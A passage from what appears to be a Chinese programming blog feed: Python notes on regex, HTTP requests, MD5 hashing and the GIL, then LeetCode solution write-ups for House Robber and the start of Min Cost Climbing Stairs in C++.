<code>k</code> 那該怎麼找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">print</span>(re.search(<span class="string">r&#x27;[A-Za-z]+@[A-Za-z]+\.[a-z]+&#x27;</span>, mail_list))</span><br><span class="line"></span><br><span class="line"><span class="comment">## Output</span></span><br><span class="line"><span class="comment"># &lt;re.Match object; span=(1, 17), match=&#x27;kevin@amazon.com&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>這代表從字元集 <code>A-Z</code> 和 <code>a-z</code> 中任意的字母， 然後 <code>+</code> 代表前面的字元在比對過程中，出現一次到多次。由於 <code>.</code> 會是一種 wildcard 因此會需要透過反斜線 <code>\</code> 進行跳脫。</p><p><strong>re 模組將常用字元集 <code>[a-zA-Z0-9_]</code> 用  <code>\w</code> 來代表，而一般數字 <code>[0-9]</code> 則使用 <code>\d</code> 來代表</strong></p><p>所以上面程式碼可以替換成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">print</span>(re.search(<span class="string">r&#x27;\w+@\w+\.\w+&#x27;</span>, mail_list))</span><br><span class="line"></span><br><span class="line"><span class="comment">## Output</span></span><br><span class="line"><span class="comment"># &lt;re.Match object; span=(1, 17), match=&#x27;kevin@amazon.com&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>為的可以更好的存取返回的匹配物件，<strong>可以透過括號來定義匹配結果的 Group</strong>，回傳匹配的group 可以透過數值直接從回傳物件中取得結果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\w+)@(\w+)\.(\w+)&#x27;</span>, mail_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">match</span>.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">## Output</span></span><br><span class="line"><span class="comment"># kevin@amazon.com</span></span><br></pre></td></tr></table></figure><p>為了更加方便存取返回的匹配物件，<strong>可以透過 <code>?P&lt;NAME&gt;</code> 來去幫group命名</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&#x27;(?P&lt;name&gt;\w+)@(?P&lt;SLD&gt;\w+)\.(?P&lt;TLD&gt;\w+)&#x27;</span>, mail_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">match</span>.group(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">## Output</span></span><br><span class="line"><span class="comment"># kevin</span></span><br></pre></td></tr></table></figure><p><em>如何在一個檔案中找到所有 IP Address?</em></p><p>對於這樣的 input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In the ever-evolving digital landscape, tracking online data often requires observing user interactions from various regions. For instance, a significant number of logins were recorded from IP addresses like 24.31.173.2 and 82.33.11.118, which reflect diverse user origins. Security teams frequently monitor these access points, noting unusual activity from IPs such as 45.56.148.51 and 99.116.96.74.</span><br><span class="line"></span><br><span class="line">On an average day, they might encounter new sessions from endpoints like 24.15.139.93 or 67.166.35.191, each needing real-time analysis to ensure data protection. In one case, an IP address from the Asia-Pacific region, 180.215.121.104, demonstrated a high frequency of requests, which raised some flags in the system.</span><br><span class="line"></span><br><span class="line">Europe is also represented in traffic logs, with IPs such as 64.130.155.78 and 186.176.159.218 originating from locations that maintain stringent data compliance regulations. The North American region had frequent logins from addresses like 71.239.86.182 and 69.43.251.147, where several were validated for secure access.</span><br><span class="line"></span><br><span class="line">Moreover, a pattern was observed with IPs like 100.12.201.224 and 85.164.201.224 accessing confidential systems during peak hours. Meanwhile, analysts in cybersecurity teams often encounter unusual log requests from regions like 120.156.7.200, necessitating further investigation.</span><br><span class="line"></span><br><span class="line">The logs also revealed consistent access from IPs like 24.61.142.106, which had been previously flagged for unauthorized attempts. Similarly, 99.58.40.206 and 70.15.237.26 showed a surge in activity, prompting immediate protocol checks. Another example is the IP 108.205.48.11, detected during an audit of high-value transactions.</span><br><span class="line"></span><br><span class="line">Many more instances, such as connections from 72.168.129.149 and 189.224.44.46, add complexity to monitoring systems. Security teams must evaluate each source, even those with benign records like 68.60.26.228 or frequent accesses from 24.236.160.189.</span><br><span class="line"></span><br><span class="line">Moreover, the system recorded remote sessions from addresses like 100.36.162.76 and 47.16.121.249, both requiring location verification steps. High-risk IPs, such as 184.4.175.60 and 62.19.65.98, were flagged during the latest vulnerability scan, which further highlighted global risks.</span><br><span class="line"></span><br><span class="line">Unusual activity from Latin America was seen with addresses like 186.35.108.144, while other regions showed minimal access, as with 189.24.118.68. IPs from North America, like 71.75.81.146 and 72.89.236.44, represent legitimate access but require continuous monitoring. For example, sessions from 174.125.174.95 often triggered notifications, especially those attempting to access privileged systems.</span><br><span class="line"></span><br><span class="line">A deeper look at international traffic unveiled access from IP 190.244.119.142, a significant address due to its activity level. Occasional spikes were noted from Europe, with entries from IP 84.26.122.138, which was scrutinized during regular audits.</span><br><span class="line"></span><br><span class="line">Lastly, domestic IPs like 65.112.10.60 and overseas ones such as 108.71.92.240 reveal the complexity of maintaining cybersecurity in a global context. One user from an IP at 1.43.41.29 exhibited typical behavior but underscored the need for constant vigilance.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_IP</span>(<span class="params">file_Path</span>):</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(file_Path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    text = file.read()</span><br><span class="line">    <span class="keyword">match</span> = re.findall(<span class="string">r&#x27;(\d+)\.(\d+).(\d+)\.(\d+)&#x27;</span>, text)</span><br><span class="line">    ip_list = [<span class="string">&#x27;.&#x27;</span>.join(ip) <span class="keyword">for</span> ip <span class="keyword">in</span> <span class="keyword">match</span>] </span><br><span class="line">  <span class="keyword">return</span> ip_list</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(find_IP(<span class="string">&#x27;example.txt&#x27;</span>))</span><br></pre></td></tr></table></figure><p>一樣透過 re 模組來找到文章中的IP位址</p><h1 id="發請求的各種用法"><a href="#發請求的各種用法" class="headerlink" title="發請求的各種用法"></a>發請求的各種用法</h1><p>在 Python 中若要發送請求給Server，大多會用到 <code>requests</code> 模組。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;https://google.com&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>可用的 HTTP Methods</p><table><thead><tr><th>HTTP Method</th><th>Request</th><th>Description</th></tr></thead><tbody><tr><td>GET</td><td><code>requests.get(url)</code></td><td>可額外設定  <code>params</code> dictionary</td></tr><tr><td>POST</td><td><code>requests.post(url)</code></td><td>可額外設定 <code>data</code> dictionary</td></tr><tr><td>PUT</td><td><code>requests.put(url)</code></td><td>可額外設定 <code>data</code> dctionary</td></tr><tr><td>DELETE</td><td><code>requests.delete(url)</code></td><td>刪除指定資源</td></tr><tr><td>HEAD</td><td><code>requests.head(url)</code></td><td>僅請求資源 response header</td></tr><tr><td>OPTIONS</td><td><code>requests.options(url)</code></td><td>請求回傳該資源所支援的所有HTTP 請求方法</td></tr></tbody></table><blockquote><p>另外，也可以使用 <code>http.client</code> 模組來去發送請求，這個模組屬於 Python標準函式庫</p></blockquote><h1 id="加密資料"><a href="#加密資料" class="headerlink" title="加密資料"></a>加密資料</h1><p>在 Python 中可以透過套件 <code>cryptography</code> 來幫文字資訊加密，另外也可以透過 <code>hashlib</code> 來進行雜湊處理</p><h2 id="使用-Hashlib-進行雜湊"><a href="#使用-Hashlib-進行雜湊" class="headerlink" title="使用 Hashlib 進行雜湊"></a>使用 Hashlib 進行雜湊</h2><p><code>hashlib</code> 提供多種雜湊函式: SHA1, SHA224, SHA384, SHA512 以及 MD5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;This is the message&quot;</span></span><br><span class="line">bsecrets = secret.encode()</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(bsecrets)</span><br><span class="line"><span class="built_in">print</span>(m.hexdigest())</span><br></pre></td></tr></table></figure><p>在對字進行雜湊前，需要先用 <code>encode</code> 方法將其轉換成二進位字串。接著建立 MD5 hash 物件，這個物件可以用來處理我們的訊習並計算出MD5 Hash值。</p><p>之後就是更新hash object，透過 <code>update</code> 方法傳入二進位字串進行hash處理，之後輸出長度為 16 bytes 的 MD5 hash</p><p>Output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">87f77fdd7fa847899a10a7aab651bd75</span><br></pre></td></tr></table></figure><h1 id="Misc-Questions"><a href="#Misc-Questions" class="headerlink" title="Misc Questions"></a>Misc Questions</h1><p><em>What do Python Interpreter do?</em></p><p><img src="/img/devops/python/python_flow.png"></p><ul><li>Parsing<ul><li>Python 解釋器會在這階段將程式碼轉換成 AST(Abstract Syntax Tree)<ul><li>轉換過程中涉及： Lexical Analysis 以及 Syntax Analysis</li><li>通常 Syntax Error 都是在這一階段發現的</li></ul></li></ul></li><li>Compilation<ul><li>AST 會被轉換為 Bytecode，可以被 Python 虛擬機(PVM)執行</li></ul></li><li>Execution<ul><li>PVM 會解釋並執行這些 Bytecode</li><li>PVM 會是一種 Stack Machine，可以管理並逐行執行 Bytecode</li></ul></li></ul><blockquote><p>詳細流程可以參考 <a href="https://medium.com/citycoddee/python%E9%80%B2%E9%9A%8E%E6%8A%80%E5%B7%A7-5-python-%E5%88%B0%E5%BA%95%E6%80%8E%E9%BA%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C-%E7%9B%B4%E8%AD%AF-%E7%B7%A8%E8%AD%AF-%E5%AD%97%E7%AF%80%E7%A2%BC-%E8%99%9B%E6%93%AC%E6%A9%9F%E7%9C%8B%E4%B8%8D%E6%87%82-553182101653">這篇文章</a></p></blockquote><p><em>What is Python Global Interpreter Lock(GIL)?</em></p><ul><li>Python GIL 是 Python Interpreter (僅在CPython中有) 當中的一種互斥鎖，用來保證同一時間，只有一個執行緒會執行Python 的 Bytecode，而這可以用來解決記憶體管理的問題 E.g. Race Condition</li></ul><p><em>How GIL effect the multi-threading application?</em></p><ul><li>GIL 會限制多執行緒應用的併發能力(Concurrency)，在CPU密集的任務中效果不會很好，畢竟CPU有多顆核心可以分攤運算</li><li>可以使用多處理程序(multiprocessing)來繞過GIL的限制。或者改用沒有GIL的Python 來實現，像是 IronPython</li></ul><blockquote><p><a href="https://yhtechnote.com/global-interpreter-lock/">https://yhtechnote.com/global-interpreter-lock/</a><br><a href="https://chtseng.wordpress.com/2024/02/29/python%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%88%87%E5%B9%B3%E8%A1%8C%E8%99%95%E7%90%86/">https://chtseng.wordpress.com/2024/02/29/python%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%88%87%E5%B9%B3%E8%A1%8C%E8%99%95%E7%90%86/</a></p></blockquote><p><em>請詳細解釋一下 Concurrency 以及 Parallelism 之間的差異</em></p><p><strong>Concurrency</strong> 為併發，代表在單一CPU&#x2F;核心上的執行能力，多個Task彼此會在交錯執行<br><strong>Parallelism</strong> 則為平行處理，代表多個CPU&#x2F;和新的執行能力，可能會包含多個 Concurrency Tasks</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://github.com/bregman-arie/python-exercises">https://github.com/bregman-arie/python-exercises</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> DevOps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入室搶劫問題 | Medium | LeetCode#198. House Robber</title>
      <link href="/posts/981b9e2f.html"/>
      <url>/posts/981b9e2f.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/198/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目描述: 題目假設你是一個專業的竊賊，街上的屋子都有一筆現金，在街上挨家挨戶的入室竊盜，但如果你偷了相鄰兩間屋子就會觸發自動警報報警，你就會被抓。給定一個整數陣列 <code>nums</code> 代表街上每間屋子藏有的錢有多少，請回傳竊賊在不觸發警報的狀況下，可以偷到最大數目的金額。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我的想法就是，其實就是要找一個陣列 <strong>除了相鄰元素外彼此的相加的所有可能組合當中的最大和</strong>。舉例來說，給定 <code>nums=&#123;2,7,9,3,1&#125;</code>，那非相鄰的所有可能組合如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2,9,1 =&gt; 12</span><br><span class="line">2,3 =&gt; 5</span><br><span class="line">7,3 =&gt; 10</span><br><span class="line">7,1 =&gt; 8</span><br><span class="line">9, 1 =&gt; 10</span><br></pre></td></tr></table></figure><p>這當中數值最大的和為 12，而因此有了下面的遞迴做法</p><h2 id="錯誤解法"><a href="#錯誤解法" class="headerlink" title="錯誤解法"></a>錯誤解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">robHelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= nums.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> robCurrent = nums[start] + <span class="built_in">robHelper</span>(nums, start + <span class="number">2</span>);</span><br><span class="line">        <span class="type">int</span> skipCurrent = <span class="built_in">robHelper</span>(nums, start + <span class="number">1</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(robCurrent, skipCurrent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">robHelper</span>(nums, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面的解法的想法在於，對於當前房屋，<strong>選擇搶或不搶，如果要搶，就將當前的房子與下下個房子的金額做加總；今天如果不搶，那就移動到下一個房子</strong>。 每次都要將當前要搶，跟當前不搶的結果做比對，找出結果金額最大的。 但這樣的做法會有大量重複計算的子問題。因此在 Submit 後出現 <em>Time Limit Exceeded</em> 錯誤</p><p>因此接下來，需要進行 <a href="https://leozzmc.github.io/posts/dynamic_programming.html#%E6%AD%A5%E9%A9%9F%E4%BA%8C-Recursion-Memoization">我先前DP文章中</a> 所提到的步驟二 <strong>Recursion + Memoization</strong></p><h2 id="我的解答"><a href="#我的解答" class="headerlink" title="我的解答"></a>我的解答</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">robHelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= nums.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(dp[start]!=<span class="number">-1</span>) <span class="keyword">return</span> dp[start];</span><br><span class="line">        <span class="type">int</span> robCurrent = nums[start] + <span class="built_in">robHelper</span>(nums, start + <span class="number">2</span>);</span><br><span class="line">        <span class="type">int</span> skipCurrent = <span class="built_in">robHelper</span>(nums, start + <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        dp[start] =  <span class="built_in">max</span>(robCurrent, skipCurrent);</span><br><span class="line">        <span class="keyword">return</span> dp[start];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        dp.<span class="built_in">resize</span>(nums.<span class="built_in">size</span>(), <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">robHelper</span>(nums, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡宣告了一個陣列 <code>dp</code>，用來存放每次 <code>robCurrent</code> 以及 <code>skipCurrent</code> 的比較結果，並且將其初始化為 -1</p><p>而在 <code>robHelper</code>函數中，可以看到我做的調整，在每一次比較中，如果發現 <code>dp[start]</code> 不等於 -1，就代表對應比較結果前面已經有計算過了，這時候就不需要去重複計算，因此直接返回 <code>dp[start]</code> 即可。</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">遞迴呼叫圖解</summary><div class="toggle-content"><p>字跡醜陋請包涵</p><p><img src="/img/LeetCode/198/algo1.png"></p><p><img src="/img/LeetCode/198/algo2.png"></p><p><img src="/img/LeetCode/198/algo3.png"></p><p><img src="/img/LeetCode/198/algo4.png"></p></div></details><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/198/result1.jpeg"></p><h2 id="最佳化解答"><a href="#最佳化解答" class="headerlink" title="最佳化解答"></a>最佳化解答</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums.<span class="built_in">size</span>()==<span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums.<span class="built_in">size</span>()==<span class="number">2</span>) <span class="keyword">return</span> <span class="built_in">max</span>(nums[<span class="number">0</span>], nums[<span class="number">1</span>]);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(nums.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="built_in">max</span>(nums[<span class="number">0</span>], nums[<span class="number">1</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>; i&lt;nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>], dp[i<span class="number">-2</span>] + nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[nums.<span class="built_in">size</span>()<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡的更佳解答會是 <a href="https://leozzmc.github.io/posts/dynamic_programming.html">先前整理的DP文章</a> 中提到的 <strong>第三步驟: Iteration + Tabulation</strong>，也就是不透過遞迴，而是透過迴圈做到一樣的效果。在程式碼中，首先將 edge case 返回，像是 <code>nums</code> 為空，或者是 <code>nums</code> 只有一個或兩個元素時的狀況。</p><p>接著初始化一個長度跟 <code>nums</code> 一樣的陣列 <code>dp</code> 為0，並且該期第一個元素為 <code>nums</code> 包含的第一個元素，而第二個元素則會是</p><p><em>dp陣列初始化</em></p><p><img src="/img/LeetCode/198/dp_init.png"></p><p><em>迭代 dp 陣列</em></p><p><img src="/img/LeetCode/198/dp_iter.png"></p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/198/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>Recurstion: $O(n)$</p><p>在 <code>robHelper</code> 函數中，透過 <code>start</code> 位置從左至右進行遞迴計算，每個位置最多只會計算一次。由於我們使用 <code>dp</code> 來儲存已經計算過的結果，當再次遇到相同的 <code>start</code> 值時，可以直接從 <code>dp</code> 中讀取結果，而不需要重複計算，因此 <code>robHelper</code> 函數在每個 <code>start</code> 位置上僅進行一次計算，從而使整個計算量是線性的，即 $O(n)$</p><p>Iteration: $O(n)$</p><p>for 遍歷了 <code>nums</code> 陣列，從 <code>i = 2</code> 到 <code>i = nums.size() - 1</code>，因此需要執行  <code>n−2</code> 次迴圈操作。每次迴圈內都是進行簡單計算和比較操作，為 $O(1)$，因此整體時間複雜度為 $O(n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>Recursion: $O(n)$</p><p><code>dp</code>，大小為 <code>nums.size()</code> 用於儲存每個 start 位置的計算結果，因此需要 $O(n)$ 大小的空間，並且每個遞迴呼叫 stack 的深度也為 n</p><p>Iteration: $O(n)$</p><p><code>dp</code>，大小為 <code>nums.size()</code>，用於儲存每個位置 <code>i</code> 能搶劫的最大金額，因此需要 $O(n)$ 大小的空間</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最小成本爬樓梯問題 | Easy | LeetCode#746. Min Cost Climbing Stairs</title>
      <link href="/posts/7f2c305b.html"/>
      <url>/posts/7f2c305b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/746/question.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目給定一個整數陣列 <code>cost</code>，其中 <code>cost[i]</code> 代表通過第 <code>i</code> 階所需要的成本，一旦付完成本後，就可以再度選擇走一階還是兩階直到到達階梯頂端。題目也有說明，起點也可以選第一階 (index&#x3D;0) 或者第二階 (index&#x3D;1) 開始。<strong>這題的最終目標要求的是到達頂端所需要的最小成本是多少。</strong></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題是基於 <a href="https://leozzmc.github.io/posts/355cc876.html">LeetCode 76.  Climbing Stairs</a> 的延伸問題。那這題根據題目給的例子，假設 <code>cost=[10,15,20]</code> 由於初始可以選第一階或第二階，而所有走法如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10, 15, 20 = 45   (每次走一階)</span><br><span class="line">10,20 = 30        (先走一步再一次跨兩階)</span><br><span class="line">15, 20 = 35       (起點在第二階，然後再走一階)</span><br><span class="line">15                (起點在第二，然後一次走跨兩階)</span><br></pre></td></tr></table></figure><p>因此要目前需要找出的遞迴關係是，<strong>對於任意階梯的最小成本是多少</strong></p><blockquote><p>其實在這個問題中就可以發現這是會有重疊的子問題，並且之後有機會對重複計算進行最佳化，因此可以用某些 DP 的步驟進行處理。</p></blockquote><p>核心問題可以歸結為：<strong>在任意一階的最小成本，應該由之前走法中成本最低的路徑決定。</strong> 從前一階到當前階，可能是一次走一步，也可能是跨兩步，不論哪種走法，只要成本最小即可。因此，<strong>任意一階的最小成本應該是當前階的成本加上前一階或前兩階中已經達到最小成本的那一個。</strong> 由此，我們可以歸納出遞迴關係式：$F(n) &#x3D; cost(n) + \min(F(n-1), F(n-2))$</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; cost, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[n]!= <span class="number">-1</span>) <span class="keyword">return</span> dp[n];</span><br><span class="line">        <span class="keyword">if</span>(n &lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span> || n ==<span class="number">1</span>)&#123;</span><br><span class="line">            dp[n] = cost[n];</span><br><span class="line">            <span class="keyword">return</span> dp[n];</span><br><span class="line">        &#125;       </span><br><span class="line">        dp[n] =  cost[n] + <span class="built_in">min</span>(<span class="built_in">helper</span>(cost, n<span class="number">-1</span>), <span class="built_in">helper</span>(cost, n<span class="number">-2</span>));</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span 